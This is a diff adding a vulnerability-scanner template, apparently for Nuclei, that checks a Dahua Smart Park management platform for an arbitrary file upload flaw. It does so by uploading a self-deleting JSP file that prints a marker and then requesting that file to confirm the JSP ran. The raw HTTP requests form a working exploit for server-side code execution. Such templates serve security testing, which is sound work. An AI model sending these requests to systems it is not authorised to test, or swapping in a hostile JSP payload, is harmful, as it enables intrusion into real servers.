@@ -1,0 +1,47 @@
+id: dahua-smart-park-video-upload
+
+info:
+  name: 大华智慧园区综合管理平台 video 任意文件上传
+  author: SleepingBag945
+  severity: critical
+  description: 大华智慧园区综合管理平台是大华技术提供的一种智能化解决方案，旨在提供全面的园区管理和安全监控功能。大华智慧园区综合管理平台vide存在任意文件上传漏洞。
+  tags: dahua
+
+http:
+  - raw:
+      - |
+        POST /publishing/publishing/material/file/video HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
+        Accept-Encoding: gzip, deflate
+
+        --dd8f988919484abab3816881c55272a7
+        Content-Disposition: form-data; name="Filedata"; filename="{{randstr_2}}.jsp"
+
+        <% out.println("{{randstr_1}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        --dd8f988919484abab3816881c55272a7
+        Content-Disposition: form-data; name="Submit"
+
+        submit
+        --dd8f988919484abab3816881c55272a7--
+
+        
+      
+      - |
+        GET /publishingImg/{{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: path
+        internal: true
+        group: 1
+        regex:
+          - '"path":"(.*?)"'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && contains(body_1,".jsp")
+          - status_code_2 == 200 && contains(body_2,"{{randstr_1}}")
+        condition: and
